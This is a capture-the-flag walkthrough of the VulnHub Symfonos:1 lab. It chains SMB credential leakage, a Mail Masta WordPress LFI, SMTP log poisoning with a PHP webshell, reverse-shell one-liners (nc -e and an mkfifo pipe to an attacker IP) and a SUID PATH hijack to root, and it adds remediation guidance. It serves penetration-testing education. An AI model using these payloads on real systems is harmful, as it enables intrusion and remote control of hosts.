# VulnHub Symfonos:1 — When Samba Sings the Blues

Alright guys!! This one has it all: SMB shares leaking plaintext creds, a WordPress plugin with a juicy LFI, SMTP log poisoning to turn that LFI into RCE, and a SUID binary with a relative PATH call that hands you root like it is nothing. Symfonos:1 is a noice beginner-to-intermediate chain that maps beautifully to real enterprise attack paths. gg to the author for the Greek mythology theme, dude.

Huge thanks to **Zayotic** for putting together a VM that teaches SMB enumeration, LFI, log poisoning, and PATH hijacking in a single clean chain. This is exactly the kind of machine that shows up in OSCP practice labs. legit.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner to Intermediate |
| **Target VM** | Symfonos:1 |
| **Attacker VM** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/symfonos-1,322/ |
| **Techniques** | Host discovery, Nmap, SMB enumeration (enum4linux, smbclient), WordPress enumeration (WPScan), LFI via Mail Masta plugin (EDB-40290), SMTP log poisoning, reverse shell, SUID binary PATH hijack, privilege escalation |
| **CVEs** | No single CVE for Mail Masta LFI (Exploit-DB 40290). SMB EternalBlue CVE-2017-0144 present on older SMB configs. |

---

## Attack Summary

```
[arp-scan / nmap: 192.168.x.x]
    |
    v
[nmap: 21/ftp, 22/ssh, 25/smtp, 80/http, 139+445/smb]
    |
    v
[enum4linux: users found -> helios; shares -> anonymous, helios]
    |
    v
[smbclient anonymous: attention.txt (password hint)]
    |
    v
[smbclient helios (password: qwerty): todo.txt -> /h3l105 WordPress path]
    |
    v
[/etc/hosts: 192.168.x.x symfonos.local]
    |
    v
[WPScan: Mail Masta plugin -> LFI via count_of_send.php (EDB-40290)]
    |
    v
[LFI confirmed: ?pl=/etc/passwd]
    |
    v
[SMTP log poisoning: telnet 25 -> inject PHP webshell into /var/mail/helios]
    |
    v
[LFI + poisoned log: ?pl=/var/mail/helios&c=id -> www-data RCE]
    |
    v
[Reverse shell via URL-encoded nc command -> nc -lvp 1234]
    |
    v
[www-data shell: find SUID -> /opt/statuscheck]
    |
    v
[strings /opt/statuscheck: relative "curl" call -> PATH hijack]
    |
    v
[cd /tmp; echo "/bin/sh" > curl; chmod 777 curl; export PATH=/tmp:$PATH; /opt/statuscheck]
    |
    v
[ROOT -> cat /root/proof.txt]
```

---

## Methodology

1. Host discovery and full-port Nmap scan
2. SMB enumeration: shares, users, and plaintext credentials
3. WordPress discovery and plugin vulnerability enumeration
4. LFI exploitation via Mail Masta plugin (EDB-40290)
5. SMTP log poisoning to achieve RCE via LFI
6. Reverse shell as www-data
7. SUID binary discovery and PATH hijack for privilege escalation

---

## Step 1 — Identifying the Target

Standard host discovery in the lab network:

```bash
# Option 1: arp-scan (fast, recommended for local networks)
arp-scan --localnet --ignoredups

# Option 2: nmap ping scan
nmap -sn -T5 192.168.0.0/24
```

Note the target IP from the results. In this walkthrough it is `192.168.0.16` but yours may differ.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

```bash
nmap -A -T4 -p- 192.168.0.16
# -A: OS/version/scripts/traceroute
# -T4: aggressive timing
# -p-: all ports
```

Expected output (key ports):

```
21/tcp  open  ftp      vsftpd 2.3.5
22/tcp  open  ssh      OpenSSH 7.4p1 Debian
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X-4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16
```

We have SMB (445) and SMTP (25). Two very interesting services on a web box. ( ͡° ͜ʖ ͡°)

> **Real-world note:** SMB exposure on Linux hosts running Samba is a significant attack surface. EternalBlue (CVE-2017-0144) exploited SMB to spread WannaCry ransomware in 2017, affecting over 200,000 machines globally. Lazarus Group (APT38) and various ransomware operators use SMB enumeration as a routine step in lateral movement. Reference: https://attack.mitre.org/software/S0366/

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1039 Data from Network Shared Drive]

---

## Step 3 — SMB Enumeration: Shares, Users, and Credentials

> **What is SMB enumeration?**
> Server Message Block (SMB) is a network file sharing protocol. Misconfigurations such as anonymous shares or weak credentials are extremely common and have been abused by threat actors since at least the early 2000s. Tools like enum4linux automate the extraction of users, shares, and policies.
> Reference: https://www.samba.org/

```bash
enum4linux 192.168.0.16
# Enumerate shares, users, groups, password policies
```

Key output to note:

```
user:[helios] rid:[1000]

//192.168.0.16/anonymous
//192.168.0.16/helios
```

Connect to the anonymous share (no password needed):

```bash
smbclient //192.168.0.16/anonymous
# password: <just hit Enter>
smb: \> ls
smb: \> get attention.txt
```

Read `attention.txt`:

```
Can users please stop using passwords like 'qwerty' or 'password'! 
Sincerely, Zeus
```

Bruh. That is a password hint right there. ( ͡° ͜ʖ ͡°)

Now connect to the `helios` share using the hinted password:

```bash
smbclient //192.168.0.16/helios -U helios
# password: qwerty
smb: \> ls
smb: \> get todo.txt
```

Read `todo.txt`:

```
1. Add users
2. Fix WordPress issues
3. Access portal at /h3l105
```

**Credentials: helios:qwerty** and the WordPress path is `/h3l105`. ᕕ( ᐛ )ᕗ

You can also use `smbmap` as an alternative:

```bash
smbmap -H 192.168.0.16 -u anonymous
smbmap -H 192.168.0.16 -u helios -p qwerty
```

> **Real-world note:** SMB anonymous shares leaking internal paths and credentials are a recurring finding in enterprise pentests. The 2021 Hafnium (Microsoft Exchange) post-exploitation chain frequently involved SMB share enumeration to locate credentials and lateral movement paths. Reference: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

> **MITRE ATT&CK:** [TA0007 Discovery] [T1039 Data from Network Shared Drive] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Step 4 — WordPress Enumeration

Add the hostname to your hosts file so WordPress loads correctly:

```bash
echo "192.168.0.16    symfonos.local" >> /etc/hosts
```

Browse to `http://symfonos.local/h3l105/`. WordPress installation confirmed.

Now enumerate installed plugins:

```bash
wpscan --url http://symfonos.local/h3l105/ --enumerate p
# --enumerate p: enumerate plugins
```

WPScan flags the **Mail Masta plugin** as installed. A quick search reveals:

- Exploit-DB 40290: Local File Inclusion in `mail-masta` 1.0
- The vulnerability is in `count_of_send.php` which passes the `pl` parameter directly to `include()` without sanitization.

> **What is Local File Inclusion (LFI)?**
> LFI occurs when a web application uses user-controllable input to specify a file path for `include()` or `require()` operations in PHP. An attacker can traverse the filesystem and read sensitive files like `/etc/passwd`, `/var/log/apache2/access.log`, or mail logs.
> CWE-98: Improper Control of Filename for Include/Require Statement
> Reference: https://owasp.org/www-project-web-security-testing-guide/

> **MITRE ATT&CK:** [TA0007 Discovery] [T1518 Software Discovery]

---

## Step 5 — LFI via Mail Masta Plugin (EDB-40290)

Test the LFI by requesting `/etc/passwd`:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Expected output in browser: contents of `/etc/passwd`. LFI confirmed. ✓

```
root:x:0:0:root:/root:/bin/bash
...
helios:x:1000:1000::/home/helios:/bin/bash
```

Also try reading the mail log for `helios` to see its format:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```

If the file exists and is readable by `www-data`, you will see the mailbox content. This is our injection target.

> **Real-world note:** LFI vulnerabilities in WordPress plugins are consistently ranked among the most common critical vulnerabilities. APT41 has used PHP LFI vulnerabilities against web-facing applications as part of initial access in multiple documented campaigns. Reference: https://www.fireeye.com/current-threats/apt-groups/rpt-apt41.html

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [CWE-98]

---

## Step 6 — SMTP Log Poisoning: From LFI to RCE

> **What is SMTP log poisoning?**
> Mail Transfer Agents (like Postfix) log SMTP interactions, including data from the `MAIL FROM` and message body fields. If the mail log file is readable by the web server user AND a PHP application includes it via LFI, an attacker can inject PHP code into the log by sending a crafted email. When the LFI loads the log, the PHP interpreter executes the injected code.
> Reference: https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

Inject a PHP webshell payload into the SMTP log via telnet:

```bash
telnet 192.168.0.16 25
```

```
HELO symfonos.local
MAIL FROM: attacker@evil.com
RCPT TO: helios
DATA
<?php system($_GET['c']); ?>
.
QUIT
```

Now trigger the injected code via the LFI. First, test with `id`:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id
```

Expected output visible in page: `uid=33(www-data) gid=33(www-data)`. RCE confirmed! (☞ﾟヮﾟ)☞

Now get a proper reverse shell. Start your listener on Kali:

```bash
nc -lvp 1234
```

Trigger the reverse shell via the LFI (URL-encode the spaces with `+`):

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc+-e+/bin/sh+192.168.0.10+1234
```

If `nc -e` is not available, use the pipe method:

```
&c=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.0.10+1234+>/tmp/f
```

Shell received as `www-data`. Upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **MITRE ATT&CK:** [TA0002 Execution] [T1059.004 Unix Shell] [T1505.003 Web Shell]

---

## Step 7 — Privilege Escalation: SUID PATH Hijack

From the www-data shell, look for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable output:

```
/opt/statuscheck
```

Investigate it:

```bash
strings /opt/statuscheck
```

The binary calls `curl` without an absolute path. This is the same pattern as Zeus:1: PATH hijack time. ( ͡° ͜ʖ ͡°)

```bash
cd /tmp

# Create a fake "curl" that spawns a shell
echo "/bin/sh" > curl
chmod 777 curl

# Prepend /tmp to PATH so our fake curl is found first
export PATH=/tmp:$PATH

# Execute the SUID binary: it calls "curl", finds ours, runs sh as root
/opt/statuscheck
```

```
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**Root!** ᕕ( ᐛ )ᕗ

```bash
cat /root/proof.txt
```

> **GTFOBins note:** PATH hijacking SUID binaries that call external commands is documented extensively. Reference: https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1574.007 Path Interception by PATH Environment Variable]

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Credential | `helios:qwerty` | SMB share anonymous/attention.txt | SMB helios share access |
| Path disclosure | `/h3l105` | SMB helios/todo.txt | WordPress URL |
| Root flag | See `/root/proof.txt` | `/root/proof.txt` | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | SMB anonymous share leaking plaintext passwords | A critical misconfiguration common in enterprise Samba deployments: guest access should never be enabled on shares containing sensitive data | Disable anonymous/guest SMB access, enforce authentication, use SMB signing |
| 2 | WordPress Mail Masta plugin LFI (EDB-40290) | Vulnerable WordPress plugins are one of the most common initial access vectors in web application pentests and real breaches | Keep plugins updated, remove unused plugins, use a WAF that blocks path traversal patterns |
| 3 | SMTP log poisoning via LFI | Any LFI that can reach a log file written with PHP-injectable content becomes RCE: mail logs, Apache logs, session files | Restrict web server read permissions on log directories; disable PHP execution in /var/mail |
| 4 | SUID binary calling `curl` by relative path | SUID binaries calling external programs by relative name are privilege escalation by design | Always use absolute paths in SUID programs; audit with `find / -perm -u=s` regularly |

**Why does this matter outside the lab?**

The LFI-to-RCE via log poisoning chain is documented in numerous real-world WordPress compromises. In 2020, a campaign targeting WordPress sites with vulnerable plugins used exactly this pattern to deploy cryptominers and webshells at scale. The Lazarus Group uses SMB enumeration as standard operating procedure in lateral movement phases. For defenders: a WAF blocking `../` traversal patterns and restricted mail log permissions would have broken this chain at Step 5.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning | T1595.001 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | Data from Network Shared Drive | T1039 |
| Credential Access | TA0006 | Unsecured Credentials in Files | T1552.001 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | TA0003 | Web Shell | T1505.003 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Privilege Escalation | TA0004 | Path Interception by PATH Environment Variable | T1574.007 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Disable SMB guest/anonymous access: set `map to guest = never` in `smb.conf`.
2. Remove or update the Mail Masta WordPress plugin; never pass user input directly to `include()`.
3. Restrict web server read permissions on `/var/mail/`: `chmod 700 /var/mail/ && chown root:mail /var/mail/`.
4. Replace `/opt/statuscheck` to call `/usr/bin/curl` (absolute path) instead of `curl`.
5. Remove unnecessary SUID bits from `/opt/statuscheck` if the binary is not critical.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Block SMB (ports 139, 445) at the perimeter firewall if external exposure is detected.
- Rotate the `helios` account password immediately.
- Review PHP includes in WordPress plugins for unsanitized file path parameters.
- Audit SUID binaries: `find / -perm -u=s -type f 2>/dev/null`.

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation) for T1190 LFI exploitation
- D3-OPS (OS Process Sandboxing) for T1548.001 SUID abuse
- D3-DA (Dynamic Analysis) for T1574.007 PATH hijacking
- D3-CTS (Credential Transmission Scoping) for T1552.001

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all SUID binaries and publicly accessible SMB shares.
- Protect (PR.AC): Disable anonymous access to file shares; enforce authentication.
- Detect (DE.CM): Monitor SMB access logs and web server error logs for path traversal patterns.
- Respond (RS.AN): Isolate the host; rotate credentials; review all SMB share permissions.
- Recover (RC.RP): Rebuild from clean snapshot; verify all web application files for webshells.

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-3: Access Enforcement (restrict SMB share access)
- SI-10: Information Input Validation (sanitize PHP include() parameters)
- CM-7: Least Functionality (remove unnecessary SUID bits; disable anonymous SMB)
- AU-2: Event Logging (log SMTP connections and web requests)
- SC-28: Protection of Information at Rest (restrict /var/mail permissions)

**CISA Known Exploited Vulnerabilities:**
- CVE-2017-0144 (EternalBlue/SMBv1): not the attack path here but relevant to Samba hardening. Present in CISA KEV.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY
- Practice: Configuration Management
- Target MIL: MIL-2 (managed configuration baselines; SUID auditing in standard runbooks)

---

## Final Thoughts

Thanks to **Zayotic** for a beautifully chained VM that hits all the classic web-plus-lateral-movement techniques in one clean path. The SMTP-to-LFI twist is the kind of thing that gets overlooked in real audits when people treat mail servers as "just SMTP" without thinking about what the logs feed into.

If this walkthrough helped you, share it with your crew and keep hacking! noice

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
